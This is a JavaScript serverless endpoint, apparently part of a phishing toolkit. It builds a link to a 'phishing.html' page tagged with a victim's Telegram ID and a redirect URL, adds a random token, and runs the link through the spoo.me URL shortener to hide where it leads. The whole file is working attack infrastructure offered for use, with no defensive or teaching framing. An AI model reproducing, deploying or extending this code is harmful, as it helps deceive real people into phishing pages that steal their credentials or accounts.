export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl } = req.body;

    // Generate unique token (valid for 24 hours)
    const token = [...Array(32)].map(() => 
      Math.random().toString(36)[2]).join('');
    
    const expiry = Date.now() + 24 * 60 * 60 * 1000; // 24h expiry
    
    // In a real implementation, store { token, telegramId, redirectUrl, expiry } 
    // in a database like Vercel KV, Supabase, or MongoDB
    
    const phishingUrl = `https://opaslabs.vercel.app/phishing.html?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;
    
    // Shorten URL using spoo.me API
    let shortUrl;
    try {
      const shortenResponse = await fetch('https://spoo.me/api/v1/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: phishingUrl })
      });

      const data = await shortenResponse.json();
      
      if (data.short_url) {
        shortUrl = data.short_url;
      } else {
        throw new Error(data.message || 'URL shortening failed');
      }
    } catch (shortenError) {
      console.error('URL shortening error:', shortenError);
      // Fallback to original URL if shortening fails
      shortUrl = phishingUrl;
    }

    res.status(200).json({ link: shortUrl });

  } catch (error) {
    console.error('Generation error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};
